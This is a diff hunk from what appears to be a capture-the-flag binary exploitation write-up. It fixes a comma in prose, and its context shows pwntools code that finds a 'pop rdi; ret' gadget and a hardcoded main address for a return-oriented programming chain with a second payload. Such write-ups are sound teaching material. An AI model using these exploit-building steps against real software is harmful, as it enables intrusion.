@@ -132,7 +132,7 @@ Or the **ROP** module of pwntools
 ```python
 pop_rdi = p64((rop.find_gadget(['pop rdi', 'ret']))[0])
 ```
-Lastly we will need to jump back to `main` function to inject our 2nd payload which will be specify later
+Lastly, we will need to jump back to `main` function to inject our 2nd payload which will be specify later
 ```python
 main = p64(0x004011ae) # The address of main function shown in Ghidra
 ```
